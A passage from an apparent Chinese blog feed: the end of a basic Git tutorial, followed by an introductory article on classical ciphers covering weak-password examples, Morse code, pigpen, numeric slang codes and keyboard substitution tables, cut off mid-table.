alt="Git工作区"></center><h3 id="向仓库中添加文件流程"><a href="#向仓库中添加文件流程" class="headerlink" title="向仓库中添加文件流程"></a>向仓库中添加文件流程</h3><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/Git/Git向仓库中添加文件流程.png" alt="Git向仓库中添加文件流程"></center><h2 id="Git初始化及仓库创建和操作"><a href="#Git初始化及仓库创建和操作" class="headerlink" title="Git初始化及仓库创建和操作"></a>Git初始化及仓库创建和操作</h2><h3 id="基本信息设置"><a href="#基本信息设置" class="headerlink" title="基本信息设置"></a>基本信息设置</h3><p>设置用户名：</p><pre class=" language-git"><code class="language-git">git config --global user.name <span class="token string">'Pleione-Plus'</span></code></pre><p>设置用户名邮箱：</p><pre class=" language-git"><code class="language-git">git config --global user.email <span class="token string">'2603350388@qq.com'</span></code></pre><h3 id="初始化一个新的Git仓库"><a href="#初始化一个新的Git仓库" class="headerlink" title="初始化一个新的Git仓库"></a>初始化一个新的Git仓库</h3><ol><li>新建一个文件夹</li><li>在文件夹内初始化git（创建git仓库）</li></ol><pre class=" language-git"><code class="language-git">mkdir democd demogit init</code></pre><p>注：</p><ul><li>初始化仓库后，文件夹内生成一个.git的隐藏文件</li></ul><h3 id="向仓库添加文件"><a href="#向仓库添加文件" class="headerlink" title="向仓库添加文件"></a>向仓库添加文件</h3><pre class=" language-git"><code class="language-git">git statustouch a.phpgit statusgit add a.phpgit statusgit commit -m <span class="token string">'add a.php'</span></code></pre><h3 id="修改仓库文件"><a href="#修改仓库文件" class="headerlink" title="修改仓库文件"></a>修改仓库文件</h3><pre class=" language-git"><code class="language-git">git statusvi a.phpgit statusgit add a.phpgit statusgit commit -m <span class="token string">'add a.php'</span></code></pre><h3 id="删除仓库文件"><a href="#删除仓库文件" class="headerlink" title="删除仓库文件"></a>删除仓库文件</h3><p>删除文件</p><pre class=" language-git"><code class="language-git">rm -rf a.php</code></pre><p>从Git中华删除文件</p><pre class=" language-git"><code class="language-git">git rm a.php</code></pre><p>提交操作</p><pre class=" language-git"><code class="language-git">git commit -m <span class="token string">'提交描述'</span></code></pre><h2 id="Git远程仓库"><a href="#Git远程仓库" class="headerlink" title="Git远程仓库"></a>Git远程仓库</h2><h3 id="使用远程仓库目的"><a href="#使用远程仓库目的" class="headerlink" title="使用远程仓库目的"></a>使用远程仓库目的</h3><p>作用：备份，实现代码共享集中化管理</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/Git/Git远程仓库.png" alt="Git远程仓库"></center><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/Git/将本地仓库同步到远程仓库.png" alt="将本地仓库同步到远程仓库"></center><h3 id="Git克隆操作"><a href="#Git克隆操作" class="headerlink" title="Git克隆操作"></a>Git克隆操作</h3><p>目的：</p><p>​        将远程仓库（github对应的项目）复制到本地</p><p>代码：</p><pre class=" language-git"><code class="language-git">git clone 仓库地址</code></pre><h3 id="将本地仓库同步到git远程仓库中"><a href="#将本地仓库同步到git远程仓库中" class="headerlink" title="将本地仓库同步到git远程仓库中"></a>将本地仓库同步到git远程仓库中</h3><pre class=" language-git"><code class="language-git">git push</code></pre>]]></content>
      
      
      <categories>
          
          <category> 软件使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Git </tag>
            
            <tag> GitHub </tag>
            
            <tag> 代码托管 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>常见密码简述</title>
      <link href="/2020/09/02/chang-jian-mi-ma-jian-shu/"/>
      <url>/2020/09/02/chang-jian-mi-ma-jian-shu/</url>
      
        <content type="html"><![CDATA[<h1 id="古典密码"><a href="#古典密码" class="headerlink" title="古典密码"></a>古典密码</h1><h2 id="弱密码"><a href="#弱密码" class="headerlink" title="弱密码"></a>弱密码</h2><p>​        所谓弱密码，一般对弱密码的界定，包括用户名和密码一致，密码<strong>小于6位</strong>，单纯用<strong>单词</strong>、<strong>字母</strong>或<strong>数字</strong>做密码，键盘上的<strong>连接字符</strong>如qwerty。另外，用<strong>姓名</strong>、<strong>生日</strong>、<strong>手机号码</strong>等做密码也很容易被破解。</p><p>​        <strong>密码字典</strong>，是网络上用来破解密码的工具，它将数字、字母等随机生成各种组合，然后复制到WORD上，供破解者匹对。</p><p><strong>弱密码举例</strong>：</p><ul><li>000000</li><li>111111</li><li>11111111</li><li>654321</li><li>666666</li><li>888888</li><li>abcdef</li><li>abcabc</li><li>abc123</li><li>a1b2c3</li><li>aaa111</li><li>123qwe</li><li>qwerty</li><li>qweasd</li><li>admin</li><li>password</li><li>p@ssword</li><li>passwd</li><li>iloveyou</li><li>5201314</li><li>…</li></ul><h2 id="摩斯密码"><a href="#摩斯密码" class="headerlink" title="摩斯密码"></a>摩斯密码</h2><p>​        摩斯密码（Morse Code），又称为莫尔斯电码，是一种<strong>时通时断的信号代码</strong>，通过不同的排列顺序来表达不同的<strong>英文字母</strong>、<strong>数字</strong>和<strong>标点符号</strong>。摩斯密码是一种早期的数字化通信形式，但它不同于现代只使用零和一两种状态的二进制代码，它的代码包括五种：<strong>点</strong>、<strong>划</strong>、<strong>点和划之间的停顿</strong>、<strong>每个字符之间短的停顿</strong>、<strong>每个词之间中等的停顿以及句子之间长的停顿</strong>。（<font color="blue">现代摩尔斯电码中只使用点和线</font>）</p><p>​        摩斯密码由两种基本信号和不同的间隔时间组成：短促的点信号<strong>“$\cdot$”(Dit)</strong>；保持一定时间的长信号<strong>“-“(Dah)</strong>。间隔时间：<strong>滴：1t；嗒：3t；嘀嗒间：1t；字符间：3t；字间：7t</strong>。</p><center>表1.1 摩斯密码-字母表</center><table><thead><tr><th align="center">字母</th><th align="center">密码</th><th align="center">字母</th><th align="center">密码</th></tr></thead><tbody><tr><td align="center">A</td><td align="center"><strong>· -</strong></td><td align="center">N</td><td align="center"><strong>- ·</strong></td></tr><tr><td align="center">B</td><td align="center"><strong>- · · ·</strong></td><td align="center">O</td><td align="center"><strong>- - -</strong></td></tr><tr><td align="center">C</td><td align="center"><strong>- · - ·</strong></td><td align="center">P</td><td align="center"><strong>· - - ·</strong></td></tr><tr><td align="center">D</td><td align="center"><strong>- · ·</strong></td><td align="center">Q</td><td align="center"><strong>- - · -</strong></td></tr><tr><td align="center">E</td><td align="center"><strong>·</strong></td><td align="center">R</td><td align="center"><strong>· - ·</strong></td></tr><tr><td align="center">F</td><td align="center"><strong>· · - ·</strong></td><td align="center">S</td><td align="center"><strong>· · ·</strong></td></tr><tr><td align="center">G</td><td align="center"><strong>- - ·</strong></td><td align="center">T</td><td align="center"><strong>-</strong></td></tr><tr><td align="center">H</td><td align="center"><strong>· · · ·</strong></td><td align="center">U</td><td align="center"><strong>· · -</strong></td></tr><tr><td align="center">I</td><td align="center"><strong>· ·</strong></td><td align="center">V</td><td align="center"><strong>· · · -</strong></td></tr><tr><td align="center">J</td><td align="center"><strong>· - - -</strong></td><td align="center">W</td><td align="center"><strong>· - -</strong></td></tr><tr><td align="center">K</td><td align="center"><strong>- · -</strong></td><td align="center">X</td><td align="center"><strong>- · · -</strong></td></tr><tr><td align="center">L</td><td align="center"><strong>· - · ·</strong></td><td align="center">Y</td><td align="center"><strong>- · - -</strong></td></tr><tr><td align="center">M</td><td align="center"><strong>- -</strong></td><td align="center">Z</td><td align="center"><strong>- - · ·</strong></td></tr></tbody></table><center>表1.2 摩斯密码-数字</center><table><thead><tr><th align="center">数字</th><th align="center">密码</th><th align="center">数字</th><th align="center">密码</th></tr></thead><tbody><tr><td align="center">1</td><td align="center"><strong>· - - - -</strong></td><td align="center">6</td><td align="center"><strong>- · · · ·</strong></td></tr><tr><td align="center">2</td><td align="center"><strong>· · - - -</strong></td><td align="center">7</td><td align="center"><strong>- - · · ·</strong></td></tr><tr><td align="center">3</td><td align="center"><strong>· · · - -</strong></td><td align="center">8</td><td align="center"><strong>- - - · ·</strong></td></tr><tr><td align="center">4</td><td align="center"><strong>· · · · -</strong></td><td align="center">9</td><td align="center"><strong>- - - - ·</strong></td></tr><tr><td align="center">5</td><td align="center"><strong>· · · · ·</strong></td><td align="center">0</td><td align="center"><strong>- - - - -</strong></td></tr></tbody></table><center>表1.3 摩斯密码-标点符号</center><table><thead><tr><th align="center">标点符号</th><th align="center">密码</th><th align="center">标点符号</th><th align="center">密码</th></tr></thead><tbody><tr><td align="center">.(句号)</td><td align="center"><strong>· - · - · -</strong></td><td align="center">;(分号)</td><td align="center"><strong>- · - · - ·</strong></td></tr><tr><td align="center">,(逗号)</td><td align="center"><strong>- - · · - -</strong></td><td align="center">?(问号)</td><td align="center"><strong>· · - - · ·</strong></td></tr><tr><td align="center">‘(单引号)</td><td align="center"><strong>· - - - - ·</strong></td><td align="center">-(连字符)</td><td align="center"><strong>- · · · · -</strong></td></tr><tr><td align="center">:(冒号)</td><td align="center"><strong>- - - · · ·</strong></td><td align="center">=(等号)</td><td align="center"><strong>- · · · -</strong></td></tr><tr><td align="center">/(斜线)</td><td align="center"><strong>- · · - ·</strong></td><td align="center">!(感叹号)</td><td align="center"><strong>- · - · - -</strong></td></tr><tr><td align="center">_(下划线)</td><td align="center"><strong>· · - - · -</strong></td><td align="center">“(双引号)</td><td align="center"><strong>· - · · - ·</strong></td></tr><tr><td align="center">（</td><td align="center"><strong>- · - - ·</strong></td><td align="center">)</td><td align="center"><strong>- · - - · -</strong></td></tr><tr><td align="center">$</td><td align="center"><strong>· · · - · · -</strong></td><td align="center">&amp;</td><td align="center"><strong>·  · · ·</strong></td></tr><tr><td align="center">@</td><td align="center"><strong>· - - · - ·</strong></td><td align="center"></td><td align="center"></td></tr></tbody></table><center>表1.4 摩斯密码-特殊符号</center><table><thead><tr><th align="center">特殊符号</th><th align="center">密码</th><th align="center">特殊符号</th><th align="center">密码</th></tr></thead><tbody><tr><td align="center">AR(停止，消息结束)</td><td align="center"><strong>· - · - ·</strong></td><td align="center">BT(分隔符)</td><td align="center"><strong>- · · · -</strong></td></tr><tr><td align="center">AS(等待)</td><td align="center"><strong>· - · · ·</strong></td><td align="center">(我将重新发送最后一个单词)</td><td align="center">· · · - ·</td></tr><tr><td align="center">K(邀请发射信号)</td><td align="center"><strong>- · -</strong></td><td align="center">(同样)</td><td align="center">· ·  · ·</td></tr><tr><td align="center">SK(终止，联络结束)</td><td align="center"><strong>· · · - · -</strong></td><td align="center">(错误)</td><td align="center">· · · · · · · ·</td></tr></tbody></table><h2 id="猪圈密码"><a href="#猪圈密码" class="headerlink" title="猪圈密码"></a>猪圈密码</h2><p>​        猪圈密码(Pigpen Cipher)，亦称<strong>朱高密码</strong>、<strong>共济会暗号</strong>、<strong>共济会密码</strong>或<strong>共济会员密码</strong>，是一种以格子为基础的简单<strong>替代式密码</strong>。即使使用符号，也不会影响密码分析，亦可用在其它替代式的方法。</p><p><strong>猪圈密码的替换规则如下所示</strong>：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Cryptography/CryptoDesc/猪圈密码(基础).png" alt="猪圈密码(基础)"></center><center>图1 猪圈密码(基础)</center><p><strong>猪圈密码变种1：</strong></p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Cryptography/CryptoDesc/猪圈密码(变种1).png" alt="猪圈密码(变种1)"></center><center>图2 猪圈密码(变种1)</center><p><strong>猪圈密码变种2：</strong></p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Cryptography/CryptoDesc/猪圈密码(变种2).png" alt="猪圈密码(变种2)"></center><center>图3 猪圈密码(变种2)</center><h2 id="数字密码"><a href="#数字密码" class="headerlink" title="数字密码"></a>数字密码</h2><p>​        俗话说得好：“凡事都要做到心中有数”。数字的每一次变化都在隐性或显性地改变着我们的社会，改变着我们的生活。通过对这些数字的再认识，可以进一步了解我们的历史、认识我们的社会、拓展我们的生活。在“数字化的时代”，我们应该养成关注数字的良好习惯，在数字上多下工夫，力求让非物质文化尽快转化为物质文化。 《数字密码》不是简单地列举数字，而是通过数说数字的影响力还原其本来面目。</p><p><strong>0字部</strong>：</p><table><thead><tr><th align="center">密文</th><th align="center">明文</th></tr></thead><tbody><tr><td align="center">019425</td><td align="center">你依旧是爱我</td></tr><tr><td align="center">02746</td><td align="center">你恶心死了</td></tr><tr><td align="center">02825</td><td align="center">你爱不爱我</td></tr><tr><td align="center">03456</td><td align="center">你相思无用</td></tr><tr><td align="center">0437</td><td align="center">你是神经</td></tr><tr><td align="center">04517</td><td align="center">你是我氧气</td></tr><tr><td align="center">04527</td><td align="center">你是我爱妻</td></tr><tr><td align="center">04535</td><td align="center">你是否想我</td></tr><tr><td align="center">04551</td><td align="center">你是我唯一</td></tr><tr><td align="center">0456</td><td align="center">你是我的</td></tr><tr><td align="center">04567</td><td align="center">你是我老妻</td></tr><tr><td align="center">0457</td><td align="center">你是我妻</td></tr><tr><td align="center">045692</td><td align="center">你是我的最爱</td></tr><tr><td align="center">0487</td><td align="center">你是白痴</td></tr><tr><td align="center">0487561</td><td align="center">你是白痴无药医</td></tr><tr><td align="center">0564335</td><td align="center">你无聊时想想我</td></tr><tr><td align="center">0594184</td><td align="center">你我就是一辈子</td></tr><tr><td align="center">065</td><td align="center">原谅我</td></tr><tr><td align="center">06537</td><td align="center">你惹我生气</td></tr><tr><td align="center">07382</td><td align="center">你欺善怕恶</td></tr><tr><td align="center">0748</td><td align="center">你去死吧</td></tr><tr><td align="center">07868</td><td align="center">你吃饱了吧</td></tr><tr><td align="center">08056</td><td align="center">你不理我啦</td></tr><tr><td align="center">0837</td><td align="center">你别生气</td></tr><tr><td align="center">08376</td><td align="center">你别生气了</td></tr><tr><td align="center">095</td><td align="center">你找我</td></tr><tr><td align="center">098</td><td align="center">你走吧</td></tr></tbody></table><p><strong>1字部</strong>：</p><table><thead><tr><th align="center">密文</th><th align="center">明文</th></tr></thead><tbody><tr><td align="center">1240</td><td align="center">最爱是你</td></tr><tr><td align="center">1314</td><td align="center">一生一世</td></tr><tr><td align="center">1314925</td><td align="center">一生一世就爱我</td></tr><tr><td align="center">1372</td><td align="center">一厢情愿</td></tr><tr><td align="center">1392010</td><td align="center">一生就爱你一个</td></tr><tr><td align="center">1414</td><td align="center">意思意思</td></tr><tr><td align="center">147</td><td align="center">一世情</td></tr><tr><td align="center">1573</td><td align="center">一往情深</td></tr><tr><td align="center">1711</td><td align="center">一心一意</td></tr></tbody></table><p><strong>2字部</strong>：</p><table><thead><tr><th align="center">密文</th><th align="center">明文</th></tr></thead><tbody><tr><td align="center">200</td><td align="center">爱你哦</td></tr><tr><td align="center">20110</td><td align="center">爱你 一亿年</td></tr><tr><td align="center">20160</td><td align="center">爱你一万年</td></tr><tr><td align="center">20170</td><td align="center">爱你一千年</td></tr><tr><td align="center">20184</td><td align="center">爱你一辈子</td></tr><tr><td align="center">2030999</td><td align="center">爱你想你久久久</td></tr><tr><td align="center">2037</td><td align="center">为你伤心</td></tr><tr><td align="center">20475</td><td align="center">爱你是幸福</td></tr><tr><td align="center">20609</td><td align="center">爱你到永久</td></tr><tr><td align="center">207374</td><td align="center">爱你七生七世</td></tr><tr><td align="center">20863</td><td align="center">爱你到来生</td></tr><tr><td align="center">20999</td><td align="center">爱你久久久</td></tr><tr><td align="center">220225</td><td align="center">爱爱你爱爱我</td></tr><tr><td align="center">230</td><td align="center">爱上你</td></tr><tr><td align="center">234</td><td align="center">爱相随</td></tr><tr><td align="center">235</td><td align="center">爱上我</td></tr><tr><td align="center">240</td><td align="center">爱死你</td></tr><tr><td align="center">246</td><td align="center">饿死了</td></tr><tr><td align="center">246437</td><td align="center">爱是如此神奇</td></tr><tr><td align="center">25184</td><td align="center">爱我一辈子</td></tr><tr><td align="center">25873</td><td align="center">爱我到今生</td></tr><tr><td align="center">25910</td><td align="center">爱我久一点</td></tr><tr><td align="center">259695</td><td align="center">爱我就了解我</td></tr><tr><td align="center">259758</td><td align="center">爱我就娶我吧</td></tr><tr><td align="center">2627</td><td align="center">爱来爱去</td></tr><tr><td align="center">282</td><td align="center">饿不饿</td></tr><tr><td align="center">2925184</td><td align="center">爱就爱我一辈子</td></tr><tr><td align="center">296</td><td align="center">爱走了</td></tr></tbody></table><p><strong>3字部</strong>：</p><table><thead><tr><th align="center">密文</th><th align="center">明文</th></tr></thead><tbody><tr><td align="center">300</td><td align="center">想你哦</td></tr><tr><td align="center">30920</td><td align="center">想你就爱你</td></tr><tr><td align="center">309420</td><td align="center">想你就是爱你</td></tr><tr><td align="center">3013</td><td align="center">想你一生</td></tr><tr><td align="center">32012</td><td align="center">想念你的爱</td></tr><tr><td align="center">32069</td><td align="center">想爱你很久</td></tr><tr><td align="center">3207778</td><td align="center">想和你去吹吹风</td></tr><tr><td align="center">330335</td><td align="center">想想你想想我</td></tr><tr><td align="center">3344</td><td align="center">生生世世</td></tr><tr><td align="center">3399</td><td align="center">长长久久</td></tr><tr><td align="center">356</td><td align="center">上网了</td></tr><tr><td align="center">35910</td><td align="center">想我久一点</td></tr><tr><td align="center">369958</td><td align="center">神啊救救我吧</td></tr><tr><td align="center">3731</td><td align="center">真心真意</td></tr><tr><td align="center">39</td><td align="center">Thank you</td></tr></tbody></table><p><strong>4字部</strong>：</p><table><thead><tr><th align="center">密文</th><th align="center">明文</th></tr></thead><tbody><tr><td align="center">440295</td><td align="center">谢谢你爱过我</td></tr><tr><td align="center">4422335</td><td align="center">时时刻刻想想我</td></tr><tr><td align="center">4457</td><td align="center">速速回机</td></tr><tr><td align="center">456</td><td align="center">是我啦</td></tr><tr><td align="center">460</td><td align="center">思念你</td></tr></tbody></table><p><strong>5字部</strong>：</p><table><thead><tr><th align="center">密文</th><th align="center">明文</th></tr></thead><tbody><tr><td align="center">505</td><td align="center">SOS</td></tr><tr><td align="center">507680</td><td align="center">我一定要追你</td></tr><tr><td align="center">510</td><td align="center">我依你(我已来)</td></tr><tr><td align="center">51020</td><td align="center">我依然爱你</td></tr><tr><td align="center">51095</td><td align="center">我要你嫁我</td></tr><tr><td align="center">51396</td><td align="center">我要睡觉了</td></tr><tr><td align="center">514</td><td align="center">无意思</td></tr><tr><td align="center">515206</td><td align="center">我已不爱你了</td></tr><tr><td align="center">51620</td><td align="center">我依然爱你</td></tr><tr><td align="center">51820</td><td align="center">我已不爱你</td></tr><tr><td align="center">518720</td><td align="center">我一辈子爱你</td></tr><tr><td align="center">51920</td><td align="center">我依旧爱你</td></tr><tr><td align="center">51930</td><td align="center">我依旧想你</td></tr><tr><td align="center">520</td><td align="center">我爱你</td></tr><tr><td align="center">5201314</td><td align="center">我爱你一生一世</td></tr><tr><td align="center">52010000</td><td align="center">我爱你一万年</td></tr><tr><td align="center">5203344</td><td align="center">我爱你生生世世</td></tr><tr><td align="center"></td><td align="center">我爱你生生世世不变心</td></tr><tr><td align="center">52094</td><td align="center">我爱你到死</td></tr><tr><td align="center">521</td><td align="center">我愿意</td></tr><tr><td align="center">5230</td><td align="center">我爱上你</td></tr><tr><td align="center">5240</td><td align="center">我爱是你</td></tr><tr><td align="center">52406</td><td align="center">我爱死你了</td></tr><tr><td align="center">526</td><td align="center">我饿了</td></tr><tr><td align="center">5260</td><td align="center">我暗恋你</td></tr><tr><td align="center">530</td><td align="center">我想你</td></tr><tr><td align="center">530184</td><td align="center">我想你一辈子</td></tr><tr><td align="center">53207778</td><td align="center">我想和你去吹吹风</td></tr><tr><td align="center">53406</td><td align="center">我想死你了</td></tr><tr><td align="center">53517230</td><td align="center">我想我已经爱上你</td></tr><tr><td align="center">5366</td><td align="center">我想聊聊</td></tr><tr><td align="center">5376</td><td align="center">我生气了</td></tr><tr><td align="center">53719</td><td align="center">我深情依旧</td></tr><tr><td align="center">53770</td><td align="center">我想亲亲你</td></tr><tr><td align="center">53782</td><td align="center">我心情不好</td></tr><tr><td align="center">53880</td><td align="center">我想抱抱你</td></tr><tr><td align="center">540086</td><td align="center">我是你女朋友</td></tr><tr><td align="center">54033</td><td align="center">我是你先生</td></tr><tr><td align="center">5406</td><td align="center">我是你的</td></tr><tr><td align="center">5407</td><td align="center">我是你妻</td></tr><tr><td align="center">54064</td><td align="center">我是你老师</td></tr><tr><td align="center">54074</td><td align="center">我是你妻子</td></tr><tr><td align="center">54086</td><td align="center">我是你爸啦</td></tr><tr><td align="center">5420</td><td align="center">我只爱你</td></tr><tr><td align="center">54335</td><td align="center">无事想想我</td></tr><tr><td align="center">543720</td><td align="center">我是真心爱你</td></tr><tr><td align="center">54430</td><td align="center">我时时想你</td></tr><tr><td align="center">5452830</td><td align="center">无时无刻不想你</td></tr><tr><td align="center">546</td><td align="center">我输了</td></tr><tr><td align="center">5460</td><td align="center">我思想你</td></tr><tr><td align="center">5490</td><td align="center">我去找你</td></tr><tr><td align="center">84920</td><td align="center">我始终爱你</td></tr><tr><td align="center">554528096</td><td align="center">我无时无刻伴你左右</td></tr><tr><td align="center">555</td><td align="center">呜呜呜</td></tr><tr><td align="center">55646</td><td align="center">我无聊死了</td></tr><tr><td align="center">556520</td><td align="center">我不能不爱你</td></tr><tr><td align="center">558</td><td align="center">午午安</td></tr><tr><td align="center">55926</td><td align="center">我有多无聊</td></tr><tr><td align="center">5620</td><td align="center">我很爱你</td></tr><tr><td align="center">562059487</td><td align="center">我若爱你我就是白痴</td></tr><tr><td align="center">5630</td><td align="center">我很想你</td></tr><tr><td align="center">564335</td><td align="center">无聊时想想我</td></tr><tr><td align="center">5670</td><td align="center">我要娶你</td></tr><tr><td align="center">570</td><td align="center">我气你</td></tr><tr><td align="center">57350</td><td align="center">我只在乎你</td></tr><tr><td align="center">57386</td><td align="center">我去上班了</td></tr><tr><td align="center">57410</td><td align="center">我心属于你</td></tr><tr><td align="center">574839</td><td align="center">我其实不想走</td></tr><tr><td align="center">57520</td><td align="center">吾妻我爱你</td></tr><tr><td align="center">576</td><td align="center">我去了</td></tr><tr><td align="center">5776</td><td align="center">我出去了</td></tr><tr><td align="center">578</td><td align="center">补习班</td></tr><tr><td align="center">58</td><td align="center">晚安</td></tr><tr><td align="center">584520</td><td align="center">我发誓我爱你</td></tr><tr><td align="center">586</td><td align="center">我不来</td></tr><tr><td align="center">587</td><td align="center">我抱歉</td></tr><tr><td align="center">5871</td><td align="center">我不介意</td></tr><tr><td align="center">592</td><td align="center">我好饿</td></tr><tr><td align="center">59240</td><td align="center">我最爱是你</td></tr><tr><td align="center">59420</td><td align="center">我就是爱你</td></tr><tr><td align="center">59430</td><td align="center">我就是想你</td></tr><tr><td align="center">59520</td><td align="center">我永远爱你</td></tr><tr><td align="center">596</td><td align="center">我走了</td></tr><tr><td align="center">5976</td><td align="center">我到家了</td></tr></tbody></table><p><strong>6字部</strong>：</p><table><thead><tr><th align="center">密文</th><th align="center">明文</th></tr></thead><tbody><tr><td align="center">609</td><td align="center">到永久</td></tr><tr><td align="center">6120</td><td align="center">懒得理你</td></tr><tr><td align="center">6785753</td><td align="center">老地方不见不散</td></tr><tr><td align="center">6868</td><td align="center">溜吧！溜吧！</td></tr><tr><td align="center">687</td><td align="center">对不起</td></tr></tbody></table><p><strong>7字部</strong>：</p><table><thead><tr><th align="center">密文</th><th align="center">明文</th></tr></thead><tbody><tr><td align="center">70345</td><td align="center">请你相信我</td></tr><tr><td align="center">706</td><td align="center">起来吧</td></tr><tr><td align="center">70626</td><td align="center">请你留下来</td></tr><tr><td align="center">706519184</td><td align="center">请你让我依靠一辈子</td></tr><tr><td align="center">7086</td><td align="center">七零八落</td></tr><tr><td align="center">7087</td><td align="center">请你别走</td></tr><tr><td align="center">70885</td><td align="center">请你帮帮我</td></tr><tr><td align="center">721</td><td align="center">亲爱的</td></tr><tr><td align="center">729</td><td align="center">去喝酒</td></tr><tr><td align="center">7319</td><td align="center">天长地久</td></tr><tr><td align="center">737420</td><td align="center">今生今世爱你</td></tr><tr><td align="center">73748096</td><td align="center">今生今世伴你左右</td></tr><tr><td align="center">73807</td><td align="center">情深怕缘浅</td></tr><tr><td align="center">740</td><td align="center">气死你</td></tr><tr><td align="center">7408695</td><td align="center">其实你不了解我</td></tr><tr><td align="center">745</td><td align="center">气死我</td></tr><tr><td align="center">745420</td><td align="center">其实我是爱你</td></tr><tr><td align="center">7474074</td><td align="center">去死去死你去死</td></tr><tr><td align="center">74839</td><td align="center">其实不想走</td></tr><tr><td align="center">756</td><td align="center">辛苦了</td></tr><tr><td align="center">765</td><td align="center">去跳舞</td></tr><tr><td align="center">7678</td><td align="center">吃饱了吗</td></tr><tr><td align="center">770880520</td><td align="center">亲亲你抱抱你我爱你</td></tr><tr><td align="center">7731</td><td align="center">心心相映</td></tr><tr><td align="center">7758520</td><td align="center">亲亲我吧我爱你</td></tr><tr><td align="center">775885</td><td align="center">亲亲我抱抱我</td></tr><tr><td align="center">77543</td><td align="center">猜猜我是谁</td></tr><tr><td align="center">77895</td><td align="center">紧紧抱着我</td></tr><tr><td align="center">786</td><td align="center">吃饱了</td></tr><tr><td align="center">7998</td><td align="center">去走走吧</td></tr></tbody></table><p><strong>8字部</strong>：</p><table><thead><tr><th align="center">密文</th><th align="center">明文</th></tr></thead><tbody><tr><td align="center">8006</td><td align="center">不理你了</td></tr><tr><td align="center">8013</td><td align="center">伴你一生</td></tr><tr><td align="center">8074</td><td align="center">把你气死</td></tr><tr><td align="center">8084</td><td align="center">Baby</td></tr><tr><td align="center">809</td><td align="center">保龄球</td></tr><tr><td align="center">811176</td><td align="center">不要在一起了</td></tr><tr><td align="center">82475</td><td align="center">被爱是幸福</td></tr><tr><td align="center">825</td><td align="center">别爱我</td></tr><tr><td align="center">837</td><td align="center">别生气</td></tr><tr><td align="center">8384</td><td align="center">不三不四</td></tr><tr><td align="center">85</td><td align="center">帮我</td></tr><tr><td align="center">85941</td><td align="center">帮我告诉他</td></tr><tr><td align="center">885</td><td align="center">帮帮我</td></tr><tr><td align="center">860</td><td align="center">不留你</td></tr><tr><td align="center">865</td><td align="center">别惹我</td></tr><tr><td align="center">8716</td><td align="center">八嘎鸭路</td></tr><tr><td align="center">881</td><td align="center">拜拜哎</td></tr><tr><td align="center">8834760</td><td align="center">漫漫相思只为你</td></tr><tr><td align="center">886</td><td align="center">拜拜咯</td></tr><tr><td align="center">898</td><td align="center">分手吧</td></tr></tbody></table><p><strong>9字部</strong>：</p><table><thead><tr><th align="center">密文</th><th align="center">明文</th></tr></thead><tbody><tr><td align="center">902535</td><td align="center">求你爱我想我</td></tr><tr><td align="center">907753</td><td align="center">叫你去吃午餐</td></tr><tr><td align="center">9089</td><td align="center">求你别走</td></tr><tr><td align="center">910</td><td align="center">就依你</td></tr><tr><td align="center">918</td><td align="center">加油吧</td></tr><tr><td align="center">920</td><td align="center">好爱你</td></tr><tr><td align="center">9213</td><td align="center">钟爱一生</td></tr><tr><td align="center">930</td><td align="center">好想你</td></tr><tr><td align="center">93110</td><td align="center">好像见见你</td></tr><tr><td align="center">940194</td><td align="center">告诉你一件事</td></tr><tr><td align="center">95</td><td align="center">救我</td></tr><tr><td align="center">98</td><td align="center">久发</td></tr><tr><td align="center">987</td><td align="center">对不起</td></tr><tr><td align="center">9908875</td><td align="center">求求你别抛弃我</td></tr><tr><td align="center">995</td><td align="center">救救我</td></tr><tr><td align="center">9958</td><td align="center">救救我吧</td></tr></tbody></table><h2 id="福尔摩斯密码"><a href="#福尔摩斯密码" class="headerlink" title="福尔摩斯密码"></a>福尔摩斯密码</h2><p>​        福尔摩斯密码跳舞的小人，讲的是一个黑帮发明的一种密码，其密码就是用一个一个的跳舞的小人组成的，一个小人是一个字母。有人用这种密码进行通信，来威胁某人，福尔摩斯后来破解了这个密码，抓住了坏人。</p><p><strong>密码表</strong>：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Cryptography/CryptoDesc/福尔摩斯密码(跳舞的小人密码表).jpg" alt="福尔摩斯密码(跳舞的小人密码表)"></center><center>图4.1 跳舞的小人</center><h2 id="QWE格式密码"><a href="#QWE格式密码" class="headerlink" title="QWE格式密码"></a>QWE格式密码</h2><p>​        QWE格式密码指的是电脑键盘上26个字母的顺序，是一种简单的替换密码。</p><p><strong>密码表</strong>：</p><center>表 QWE格式密码表</center><table><thead><tr><th align="center">A</th><th align="center">B</th><th align="center">C</th><th align="center">D</th><th align="center">E</th><th align="center">F</th><th align="center">G</th><th align="center">H</th><th align="center">I</th><th align="center">J</th><th align="center">K</th><th align="center">L</th><th align="center">M</th></tr></thead><tbody><tr><td align="center">Q</td><td align="center">W</td><td align="center">E</td><td align="center">R</td><td align="center">T</td><td align="center">Y</td><td align="center">U</td><td align="center">I</td><td align="center">O</td><td align="center">P</td><td align="center">A</td><td align="center">S</td><td align="center">D</td></tr><tr><td align="center"><strong>N</strong></td><td align="center"><strong>O</strong></td><td align="center"><strong>P</strong></td><td align="center"><strong>Q</strong></td><td align="center"><strong>R</strong></td><td align="center"><strong>S</strong></td><td align="center"><strong>T</strong></td><td align="center"><strong>U</strong></td><td align="center"><strong>V</strong></td><td align="center"><strong>W</strong></td><td align="center"><strong>X</strong></td><td align="center"><strong>Y</strong></td><td align="center"><strong>Z</strong></td></tr><tr><td align="center">F</td><td align="center">G</td><td align="center">H</td><td align="center">J</td><td align="center">K</td><td align="center">L</td><td align="center">Z</td><td align="center">X</td><td align="center">C</td><td align="center">V</td><td align="center">B</td><td align="center">N</td><td align="center">M</td></tr></tbody></table><h2 id="元音密码"><a href="#元音密码" class="headerlink" title="元音密码"></a>元音密码</h2><p>​        元音密码是一种以元音字母为界，使用替代方式来表示各个字母的密码。</p><p><strong>元音密码表</strong>：</p><center>表 元音密码表</center><table><thead><tr><th align="center">A</th><th align="center">B</th><th align="center">C</th><th align="center">D</th><th align="center">E</th><th align="center">F</th><th align="center">G</th><th align="center">H</th><th align="center">I</th><th align="center">J</th><th align="center">K</th><th 